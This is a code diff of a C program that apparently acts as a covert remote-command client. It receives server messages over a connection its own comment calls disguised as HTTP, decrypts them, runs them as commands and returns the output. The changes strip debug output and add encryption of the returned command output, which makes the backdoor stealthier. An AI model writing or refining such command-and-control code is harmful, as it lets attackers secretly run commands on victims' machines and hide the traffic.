@@ -135,14 +135,11 @@ int main(void) {
     while (1) {
         // Get message from Server
         int bytesRead = recv(clientSocket, serverMessage, 1023, 0);
-        int junk = getchar(); // clearout \n
         serverMessage[bytesRead] = '\0';
-
-        printf("Server sent: %s\n", serverMessage);
 
         // Because the Connecttion is disguised in HTTP, there are a handful of headers we don't care about.
         // To do this, we just move the pointer past the wherever the substring variable is found
-        const char* substring = "charset=utf-8\n\n";
+        const char* substring = "charset=utf-8\r\n\r\n";
         char* startOfActualData = strstr(serverMessage, substring);
         startOfActualData += strnlen(substring, 19);
         strcpy_s(serverMessage, sizeof(serverMessage), startOfActualData);
@@ -150,7 +147,6 @@ int main(void) {
         // Decrypt the Message from the server
         encrypt(serverMessage);
         const char* keepAlive = "KEEP_ALIVE";
-        printf("Server Message: %s\m", serverMessage);
 
         // Check to make sure the message isn't a keep alive message
         if (strncmp(serverMessage, keepAlive, 11) != 0) {
@@ -173,10 +169,10 @@ int main(void) {
             // Read the output a line and send it back to the Server
             while (fgets(commandOutput, 8190, pipe) != NULL) {
                 // fgets appends \0 to the end, but not \n. The next 3 lines overwrite the \0 with \n, and then append \0 after
+                encrypt(commandOutput);
                 int len = strnlen(commandOutput, 8190);
                 commandOutput[len] = '\n';
                 commandOutput[len + 1] = '\0';
-                printf("%s", commandOutput);
                 send(clientSocket, commandOutput, strnlen(commandOutput, 8192), 0);
             }
 
